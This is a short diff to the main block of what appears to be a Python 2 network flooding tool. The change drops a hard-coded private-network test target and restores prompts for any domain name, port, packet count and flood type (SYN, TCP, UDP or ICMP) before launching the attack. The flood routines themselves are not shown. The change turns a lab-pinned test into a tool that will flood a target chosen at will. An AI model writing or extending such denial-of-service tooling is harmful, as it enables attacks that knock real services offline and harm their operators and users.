@@ -58,13 +58,9 @@ def getIP(domainName):
 
 
 if __name__ == '__main__':
-    #domainName = raw_input('Type the domain name: ')
-    #port = raw_input('Type the port: ')
-    #op = raw_input("Select the flood attack type: 1) syn, 2) tcp, 3)udp, 4) icmp ")
-    #count = raw_input("Select the count: ")
-    #ip = getIP(domainName)
-    ip = '192.168.1.16'
-    port = 80
-    op = '1'
-    count = 10000
+    domainName = raw_input('Type the domain name: ')
+    port = raw_input('Type the port: ')
+    op = raw_input("Select the flood attack type: 1) syn, 2) tcp, 3)udp, 4) icmp ")
+    count = raw_input("Select the count: ")
+    ip = getIP(domainName)
     option(int(count), op, ip, port)
